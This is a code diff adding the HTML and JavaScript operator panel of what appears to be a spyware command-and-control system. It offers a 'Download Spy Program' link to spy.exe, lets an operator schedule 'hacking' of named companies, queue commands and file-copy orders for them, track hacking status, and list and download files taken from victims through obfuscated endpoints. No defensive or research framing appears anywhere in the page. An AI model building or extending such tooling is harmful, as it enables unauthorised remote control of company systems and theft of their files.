@@ -1,0 +1,452 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Operation Page</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+
+</head>
+<body>
+<nav class="navbar navbar-light bg-light">
+    <div class="container">
+        <a class="navbar-brand" href=/files/spy.exe>"
+            <img src="https://rps.nasa.gov/internal_resources/110/" width="30" height="24" alt=""> Download Spy Program
+        </a>
+    </div>
+</nav>
+<div class="container">
+    <H1>Company Configuration</H1>
+    <div class="container">
+        <form id="myForm">
+            <div class="p-3 input-group ">
+                <div class="input-group-prepend">
+                    <span id="company" class="input-group-text">Enter Company name</span>
+                </div>
+                <input type="text" name="name" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+            </div>
+            <div class="p-3 input-group">
+                <div class="input-group-prepend">
+                    <span class="input-group-text" >After Days</span>
+                </div>
+                <input type="text" name="afterDays" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+            </div>
+            <div class="p-3 input-group ">
+                <div class="input-group-prepend">
+                    <span class="input-group-text" id="inputGroup-sizing-default">Work Once ?</span>
+                </div>
+                <input type="text" name="isWorkOnce" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+                <div class="p-5 container">
+                    <button type="submit" class="btn btn-primary btn-block" id="mySend" onclick="tokenControl()">Send</button>
+                </div>
+            </div>
+        </form>
+    </div>
+    <H1>Company Details</H1>
+    <div class="p-3 input-group ">
+        <div class="input-group-prepend">
+            <span class="input-group-text" >Enter Company Name</span>
+        </div>
+        <input type="text" id="companyDetails" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+            <button type="submit" class="btn btn-primary" onclick="tokenControl()&&companyDetails()">Show Details</button>
+        <table class=" table table-striped">
+            <thead>
+            <tr>
+                <th scope="col">Hacking Status</th>
+                <th scope="col">Work Once?</th>
+                <th scope="col">Running Date</th>
+            </tr>
+            </thead>
+            <tbody id="companyDetailTable">
+
+            </tbody>
+        </table>
+    </div>
+        <H1>Command Configuration</H1>
+     <div class="container">
+         <form id="commandForm">
+             <div class="p-3 input-group ">
+                 <div class="input-group-prepend">
+                     <span class="input-group-text">Enter Command</span>
+                 </div>
+                 <input type="text" name="command" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+             </div>
+             <div class="p-3 input-group">
+                 <div class="input-group-prepend">
+                     <span class="input-group-text" >Company Name</span>
+                 </div>
+                 <input type="text" name="company" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+             </div>
+             <div class="p-3 input-group ">
+                 <div class="input-group-prepend">
+                     <span class="input-group-text">Command Level</span>
+                 </div>
+                 <input type="text" name="level" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+             </div>
+             <div class="p-3 input-group ">
+                 <div class="input-group-prepend">
+                     <span class="input-group-text">Responsible ?</span>
+                 </div>
+                 <input type="text" name="isResponse" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+             </div>
+                 <div class="p-3 input-group ">
+                     <div class="input-group-prepend">
+                         <span class="input-group-text">Copy File ?</span>
+                     </div>
+                 <input type="text" name="copyFile" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+                 <div class="p-5 container">
+                     <button type="submit" class="btn btn-primary btn-block" onclick="tokenControl()">Send</button>
+                 </div>
+             </div>
+         </form>
+     </div>
+    <hr class="mt-2 mb-3"/>
+    <H1>Command Details</H1>
+    <div class="container">
+            <div class="p-3 input-group ">
+                <div class="input-group-prepend">
+                    <span class="input-group-text">Enter Command id</span>
+                </div>
+                <input type="text" name="company" id="deleteCommandId" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+
+            <button type="submit" class="btn btn-danger" onclick="tokenControl()&&deleteCommand()"> Delete Command</button>
+            <div class="p-3 input-group ">
+                <div class="input-group-prepend">
+                    <span class="input-group-text">Enter Company Name</span>
+                </div>
+            <input type="text" name="company" id="value" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+                <button type="submit" class="btn btn-primary" onclick="tokenControl()&&showData()">Show Commands</button>
+        </div>
+        <table class=" table table-striped">
+            <thead>
+            <tr>
+                <th scope="col">Id</th>
+                <th scope="col">Command</th>
+                <th scope="col">Responsible ?</th>
+                <th scope="col">Level</th>
+                <th scope="col">Copy File ?</th>
+            </tr>
+            </thead>
+            <tbody id="data">
+
+            </tbody>
+        </table>
+    </div>
+
+    <H1>Response Command Details</H1>
+    <div class="container">
+        <div class="p-3 input-group ">
+            <div class="input-group-prepend">
+                <span class="input-group-text">Enter Company Name</span>
+            </div>
+            <input type="text" name="company" id="resCommand" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+            <button type="submit" class="btn btn-primary" onclick="tokenControl()&&resCommand()">Show Response Commands</button>
+            <button type="submit" class="btn btn-danger" onclick="tokenControl()&&deleteResCommand()">Delete Response Commands</button>
+
+        </div>
+        <table class=" table table-striped">
+            <thead>
+            <tr>
+                <th scope="col">Id</th>
+                <th scope="col">Responsible Code</th>
+
+            </tr>
+            </thead>
+            <tbody id="responseData">
+
+            </tbody>
+        </table>
+    </div>
+
+
+    <H1>Watch Copied Files name Table </H1>
+    <div class="container">
+        <div class="p-3 input-group ">
+            <div class="input-group-prepend">
+                <span class="input-group-text">Enter File Name</span>
+            </div>
+            <input type="text" name="file" id="deleteFile" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+            <div class="input-group-prepend">
+                <span class="input-group-text">Enter Company Name</span>
+            </div>
+            <input type="text" name="companyDelete" id="deleteCompany" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+
+            <button type="submit" class="btn btn-danger" onclick="tokenControl()&&deleteFiles()">Delete Files</button>
+        </div>
+        <h1>SHOW</h1>
+        <div class="p-3 input-group ">
+            <div class="input-group-prepend">
+                <span class="input-group-text">Enter Company Name</span>
+            </div>
+            <input type="text" name="company" id="fileCompany" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+            <button type="submit" class="btn btn-primary" onclick="tokenControl()&&showFiles()">Show Files</button>
+        </div>
+        <table class=" table table-striped">
+            <thead>
+            <tr>
+                <th scope="col">File Name</th>
+                <th scope="col">Company Name</th>
+
+            </tr>
+            </thead>
+            <tbody id="fileData">
+
+            </tbody>
+        </table>
+    </div>
+
+    <H1>Get Current File </H1>
+    <div class="container">
+        <div class="p-3 input-group ">
+            <div class="input-group-prepend">
+                <span class="input-group-text">Enter File Name (file.tpye) format</span>
+            </div>
+            <input type="text" name="company" id="currentFile" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+            <div class="input-group-prepend">
+                <span class="input-group-text">Enter Company Name</span>
+            </div>
+            <input type="text" name="company" id="companyName" class="p-2 form-control" aria-label="Default" aria-describedby="inputGroup-sizing-default">
+
+            <button type="submit" class="btn btn-primary" onclick="tokenControl()&&getCurrentFile()">Get File</button>
+        </div>
+    </div>
+</div>
+</div>
+<script name="companyConfig">
+    const token = localStorage.getItem('token');
+    const thisForm = document.getElementById('myForm');
+    thisForm.addEventListener('submit', async function (e) {
+        e.preventDefault();
+        const formData = new FormData(thisForm).entries()
+        let response;
+        response = await fetch('hacker/set', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json','token':token},
+            body: JSON.stringify(Object.fromEntries(formData))
+
+        });
+        const result = await response.json();
+
+    });
+    const thisFormTwo = document.getElementById('commandForm');
+    thisFormTwo.addEventListener('submit', async function (e) {
+        e.preventDefault();
+        const formData = new FormData(thisFormTwo).entries()
+        let response;
+        response = await fetch('hdowbojiwtrydczsbepd/command/pjjeaizwszrqypydnqyp/new/pjjeaizwszrqypydnqyp',{
+            method: 'POST',
+            headers: {'Content-Type': 'application/json','token':token},
+            body: JSON.stringify(Object.fromEntries(formData))
+        });
+        const result = await response.json();
+    });
+        
+</script>
+
+    <script name="showData">
+
+        function showData() {
+            const token = localStorage.getItem('token');
+            const value = document.getElementById('value').value;
+            fetch('hdowbojiwtrydczsbepd/command/pjjeaizwszrqypydnqyp/commands/pjjeaizwszrqypydnqyp', {
+                method: 'GET',
+                headers: {
+                    'token':token ,
+                    'company': value,
+                },
+            })
+                .then(response => response.json())
+                .then(function (json){
+                    let placeholder = document.querySelector('#data');
+                    let out = "";
+                    for (let jsons  of json){
+                        out +=`
+                        <tr>
+                        <td>${jsons.id}</td>
+                        <td>${jsons.command}</td>
+                        <td>${jsons.responsible}</td>
+                        <td>${jsons.level}</td>
+                        <td>${jsons.copyFile}</td>
+                         </tr>
+                    `;
+                    }
+                    placeholder.innerHTML=out;
+                })
+                .catch(err => console.error(err));
+        }
+        function deleteCommand(){
+            const token = localStorage.getItem('token');
+            const id = document.getElementById('deleteCommandId').value;
+            fetch('/hdowbojiwtrydczsbepd/command/pjjeaizwszrqypydnqyp/delete-current-command', {
+                method: 'DELETE',
+                headers: {
+                    'token':token,
+                    'id':id
+                },
+            })
+                .then(response => response.json())
+
+                .catch(err => console.error(err));
+        }
+    </script>
+<script name="resCommand">
+    function resCommand() {
+        const token = localStorage.getItem('token');
+        const value = document.getElementById('resCommand').value;
+        fetch('/get-responsible-commands', {
+            method: 'GET',
+            headers: {
+                'token':token ,
+                'companyName': value,
+            },
+        })
+            .then(response => response.json())
+            .then(function (json){
+                let placeholder = document.querySelector('#responseData');
+                let out = "";
+                for (let jsons  of json){
+                    out +=`
+                        <tr>
+                        <td>${jsons.id}</td>
+                        <td>${jsons.responsibleCode}</td>
+
+                         </tr>
+                    `;
+                }
+                placeholder.innerHTML=out;
+            })
+            .catch(err => console.error(err));
+    }
+    function deleteResCommand(){
+        const token = localStorage.getItem('token');
+        const value = document.getElementById('').value;
+        fetch('/delete-current-responsible-command', {
+            method: 'DELETE',
+            headers: {
+                'token':token ,
+                'companyName': value
+            },
+        })
+            .then(response => response.json())
+
+            .catch(err => console.error(err));
+    }
+</script>
+<script name="showFile">
+    function showFiles() {
+        const token = localStorage.getItem('token');
+        const value = document.getElementById('fileCompany').value;
+        fetch('/company-files', {
+            method: 'GET',
+            headers: {
+                'token': token,
+                'company': value,
+            },
+        })
+            .then(response => response.json())
+            .then(function (json) {
+                let placeholder = document.querySelector('#fileData');
+                let out = "";
+                for (let jsons of json) {
+                    out += `
+                        <tr>
+                        <td>${jsons.fileName}</td>
+                        <td>${jsons.companyName}</td>
+                         </tr>
+                    `;
+                }
+                placeholder.innerHTML = out;
+            })
+            .catch(err => console.error(err));
+    }
+    function deleteFiles(){
+        const token = localStorage.getItem('token');
+        const filename = document.getElementById('deleteFile').value;
+        const companyName=document.getElementById('deleteCompany').value;
+        fetch('/delete-current-file', {
+            method: 'DELETE',
+            headers: {
+                'token':token ,
+                'companyName': companyName,
+                'fileName':filename
+            },
+        })
+            .then(response => response.json())
+
+            .catch(err => console.error(err));}
+</script>
+<script name="tokenControl">
+    async function tokenControl() {
+         const response  = await fetch('tokens/current-token', {
+            method: 'GET',
+            headers: {
+                'token': localStorage.getItem('token')
+            },
+        })
+           const resul = await response.json();
+            if (resul===null || resul===undefined){
+                if (confirm("Get Authentication to Continue!")) {
+                    window.location='/';
+                } else {
+                    alert('Authentication expired, you can');
+                }
+            }
+            else {
+                console.log(resul.token);
+            }
+    }
+</script>
+<script name="getCurrentFiles">
+    function getCurrentFile() {
+        const token = localStorage.getItem('token');
+        const companyName = document.getElementById('companyName').value;
+        const  fileName = document.getElementById('currentFile').value;
+
+        fetch('/image-hacker', {
+            method: 'GET',
+            headers: {
+                'token': token,
+                'companyName': companyName,
+                'fileName':fileName
+            },
+        })
+            .then(response => response.blob())
+            .then(fileBlob => {
+                const link = document.createElement('a');
+                link.href = window.URL.createObjectURL(fileBlob);
+                link.download = fileName;
+                link.click();
+            });
+
+    }
+</script>
+<script name="companyDetails">
+    function companyDetails() {
+        const token = localStorage.getItem('token');
+        const value = document.getElementById('companyDetails').value;
+        fetch('/brsydrdylcyufbfurrmw/company/flhnnhstslpmxiplpdwl/get-current-company', {
+            method: 'GET',
+            headers: {
+                'token':token ,
+                'companyName': value,
+            },
+        })
+            .then(response => response.json())
+            .then(function (json){
+                let placeholder = document.querySelector('#companyDetailTable');
+                let out = "";
+                for (let jsons  of json){
+                    out +=`
+                        <tr>
+                        <td>${jsons.isHacking}</td>
+                        <td>${jsons.isWorkOnce}</td>
+                        <td>${jsons.runningDate}</td>
+                         </tr>
+                    `;
+                }
+                placeholder.innerHTML=out;
+            })
+            .catch(err => console.error(err));
+    }
+</script>
+</body>
+</html>
